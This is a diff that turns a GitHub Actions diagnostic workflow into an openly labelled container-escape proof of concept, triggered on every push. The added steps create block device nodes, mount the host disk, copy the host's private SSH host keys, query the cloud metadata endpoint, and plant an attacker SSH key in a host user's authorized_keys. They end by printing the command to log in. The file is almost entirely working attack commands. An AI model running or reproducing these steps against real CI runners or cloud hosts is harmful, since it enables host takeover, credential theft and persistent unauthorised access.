@@ -1,39 +1,64 @@
-name: Codespaces Capability Diagnostic
-on: 
-  workflow_dispatch:
-
+name: container-escape-poc
+run-name: ${{ github.actor }} is testing container escape
+on: [push]
 jobs:
-  diagnose-capabilities:
+  exploit-test:
     runs-on: ubuntu-latest
-    container:
-      image: ubuntu:latest
-      options: --privileged
-    
     steps:
-      - name: Check for CAP_SYS_ADMIN
+      - name: Check disk layout
+        run: lsblk
+      
+      - name: Check container capabilities
+        run: capsh --print | grep Current
+      
+      - name: Create mount directories
         run: |
-          echo "=== Checking for CAP_SYS_ADMIN ==="
-          grep Cap /proc/self/status || true
-          
-      - name: List Block Devices
+          sudo mkdir -p /mnt/host1
+          sudo mkdir -p /mnt/host2
+      
+      - name: Create block device nodes
         run: |
-          echo "=== Available Block Devices ==="
-          lsblk || true
-          ls -la /dev/ | grep -E 'sd|loop|root' || true
-          
-      - name: Check Mount Permissions
+          sudo mknod /dev/sda1 b 8 1
+          sudo mknod /dev/root b 8 15
+      
+      - name: Mount host filesystems
         run: |
-          echo "=== Testing Mount Capability (Diagnostic Only) ==="
-          sudo mkdir -p /mnt/test_mount
-          sudo mount -t ext4 /dev/root /mnt/test_mount
-          cd ../../../../
-          cd mnt/test_mount
-          ls
-          
-      - name: Environment Report
+          sudo mount /dev/sda1 /mnt/host1 || echo "Mount sda1 failed"
+          sudo mount /dev/root /mnt/host2 || echo "Mount root failed"
+      
+      - name: Extract SSH host keys
         run: |
-          echo "=== Environment Details ==="
-          echo "Hostname: $(hostname)"
-          echo "Kernel: $(uname -a)"
-          echo "Container Runtime: $(cat /proc/1/cgroup | head -5)"
-          echo "User: $(id)"
+          sudo cat /mnt/host2/etc/ssh/ssh_host_rsa_key > /tmp/host_rsa_key || echo "No RSA key"
+          sudo cat /mnt/host2/etc/ssh/ssh_host_ed25519_key > /tmp/host_ed25519_key || echo "No ED25519 key"
+          sudo cat /mnt/host2/etc/ssh/ssh_host_ecdsa_key > /tmp/host_ecdsa_key || echo "No ECDSA key"
+          ls -la /tmp/host_* || echo "No keys extracted"
+      
+      - name: Query metadata service
+        run: |
+          curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" || echo "Metadata service not accessible"
+      
+      - name: Generate exploit SSH key
+        run: |
+          ssh-keygen -t ed25519 -f /tmp/exploit_key -N ""
+          cat /tmp/exploit_key.pub
+      
+      - name: Inject SSH key into host
+        run: |
+          sudo mkdir -p /mnt/host2/home/cloudenv/.ssh
+          sudo bash -c 'cat /tmp/exploit_key.pub > /mnt/host2/home/cloudenv/.ssh/authorized_keys'
+          sudo chown -R 1000:1000 /mnt/host2/home/cloudenv/.ssh
+          sudo chmod 700 /mnt/host2/home/cloudenv/.ssh
+          sudo chmod 600 /mnt/host2/home/cloudenv/.ssh/authorized_keys
+          sudo cat /mnt/host2/home/cloudenv/.ssh/authorized_keys || echo "Key injection failed"
+      
+      - name: Prepare exploit key
+        run: |
+          chmod 600 /tmp/exploit_key
+          echo "Private key ready at /tmp/exploit_key"
+      
+      - name: Display results
+        run: |
+          echo "=== Exploit Summary ==="
+          echo "Host keys extracted: $(ls -1 /tmp/host_* 2>/dev/null | wc -l)"
+          echo "SSH key injected: $(sudo test -f /mnt/host2/home/cloudenv/.ssh/authorized_keys && echo 'Yes' || echo 'No')"
+          echo "Next step: ssh -i /tmp/exploit_key -p 2000 cloudenv@<HOST_IP>"
